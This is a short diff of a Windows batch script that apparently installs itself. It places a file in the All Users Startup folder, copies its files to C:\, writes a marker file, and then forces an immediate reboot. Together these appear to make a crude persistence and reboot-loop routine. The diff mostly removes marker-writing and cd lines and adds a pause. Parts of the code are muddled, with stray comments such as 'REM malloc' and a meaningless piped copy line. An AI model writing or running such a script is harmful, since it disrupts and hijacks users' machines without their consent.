@@ -20,7 +20,6 @@ if NOT exist %_fstabloc% (
 
 if EXIST %_fstabloc% (
     @echo on
-    cd /
     echo %_fautostart% > "~tmp.lck"
     copy "~tmp.lck" "%AllUsersProfile%\Start Menu\Startup"
     pushd %_fstabloc%
@@ -38,9 +37,6 @@ IF EXIST C:\inf.rsc (
 
 REM malloc
 popd
-cd %~dp0 REM expansion to dir where files would be?????
 copy * c:\
-cd c:\
-echo installed>inf.rsc 
-copy /b inf.rsc inf.rsc |^copy /b inf.rsc inf.rsc
+pause
 shutdown -r /t 0>nul
